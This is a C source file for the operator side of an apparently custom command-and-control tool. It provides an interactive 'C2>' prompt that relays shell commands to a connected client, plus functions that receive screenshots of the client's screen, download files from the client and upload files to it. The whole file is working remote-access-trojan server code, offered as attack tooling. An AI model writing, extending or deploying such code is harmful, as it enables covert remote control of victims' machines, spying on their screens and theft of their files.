#include <stdlib.h>
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include "c2.h"
#include "server/utils.h"
#include "common.h"
#include <limits.h>
#include <string.h>

void psh_send(sock_t client_fd) {
    char buf[C2_BUF_SIZE];
    while (1) {
        printf("\nC2> ");
        fflush(stdout);
        if (!fgets(buf, C2_BUF_SIZE, stdin)) break;
        buf[strcspn(buf, "\n")] = 0;

        if (safe_send_payload(client_fd, buf, strlen(buf) + 1, 0) <= 0) break;

        if (strcmp(buf, "quit") == 0) break;
        
        char* cmd_output = (char*)safe_recv_payload(client_fd, NULL, 0);
        if (cmd_output) printf("%s\n", cmd_output);
        free(cmd_output);
    }
    return;
}

void recv_screenshot(sock_t client_fd) {
    int file_size;
    BYTE* file_buffer = (BYTE*)safe_recv_payload(client_fd, &file_size, 0);
    if (file_buffer == NULL) return;

    char filename[64];
    time_t now = time(NULL);
    snprintf(filename, sizeof(filename), "screenshot_%ld.bmp", (long)now);

    FILE *fp = fopen(filename, "wb");
    if (!fp) {
        perror("[ERR] fopen");
        free(file_buffer);
        return;
    }

    fwrite(file_buffer, 1, file_size, fp);
    fclose(fp);
    free(file_buffer);

    printf("[+] Screenshot saved to %s (%u bytes)\n", filename, file_size);
    return;
}

void download_file_from_client(sock_t client_fd) {
    char remote_path[512] = {0};
    char local_path[512] = {0};

    if (!prompt_line("Remote file path to download: ", remote_path, sizeof(remote_path))) return;
    if (remote_path[0] == '\0') {
        printf("[ERR] Remote path cannot be empty.\n");
        return;
    }

    if (!prompt_line("Local save path: ", local_path, sizeof(local_path))) return;

    if (safe_send_payload(client_fd, remote_path, strlen(remote_path) + 1, 0) < 0) return;

    char status;
    if (safe_recv(client_fd, &status, 1, 0) <= 0) return;


    if (status == '1') {
        int file_size = 0;
        BYTE *file_buffer = (BYTE*)safe_recv_payload(client_fd, &file_size, 0);
        if (!file_buffer) {
            printf("[ERR] Failed to receive file contents.\n");
            return;
        }

        FILE *fp = fopen(local_path, "wb");
        if (!fp) {
            perror("[ERR] fopen");
            free(file_buffer);
            return;
        }

        size_t expected = (size_t)file_size;
        size_t written = expected ? fwrite(file_buffer, 1, expected, fp) : 0;
        fclose(fp);
        free(file_buffer);

        if (written != expected) {
            printf("[ERR] Short write when saving %s\n", local_path);
        } else {
            printf("[+] Saved file to %s (%d bytes)\n", local_path, file_size);
        }
    } else {
        char *err_msg = (char*)safe_recv_payload(client_fd, NULL, 0);
        if (err_msg) {
            printf("[ERR] Client error: %s\n", err_msg);
            free(err_msg);
        } else {
            printf("[ERR] Client reported failure.\n");
        }
    }
}

void upload_file_to_client(sock_t client_fd) {
    char local_path[512] = {0};
    char remote_path[512] = {0};

    if (!prompt_line("Local file path to upload: ", local_path, sizeof(local_path))) return;
    if (local_path[0] == '\0') {
        printf("[ERR] Local path cannot be empty.\n");
        return;
    }

    if (!prompt_line("Destination path on client: ", remote_path, sizeof(remote_path))) return;

    size_t file_size = 0;
    char *file_buffer = read_file(local_path, &file_size);
    if (!file_buffer) {
        return;
    }

    if (file_size > INT_MAX) {
        printf("[ERR] File too large to transfer (>%d bytes)\n", INT_MAX);
        free(file_buffer);
        return;
    }

    if (safe_send_payload(client_fd, remote_path, strlen(remote_path) + 1, 0) < 0) {
        free(file_buffer);
        return;
    }
    if (safe_send_payload(client_fd, file_buffer, (int)file_size, 0) < 0) {
        free(file_buffer);
        return;
    }
    free(file_buffer);

    char status;
    if (safe_recv(client_fd, &status, 1, 0) <= 0) {
        return;
    }

    if (status == '1') {
        printf("[+] Uploaded %zu bytes to %s\n", file_size, remote_path);
    } else {
        char *err_msg = (char*)safe_recv_payload(client_fd, NULL, 0);
        if (err_msg) {
            printf("[ERR] Client error: %s\n", err_msg);
            free(err_msg);
        } else {
            printf("[ERR] Client reported failure while uploading.\n");
        }
    }
}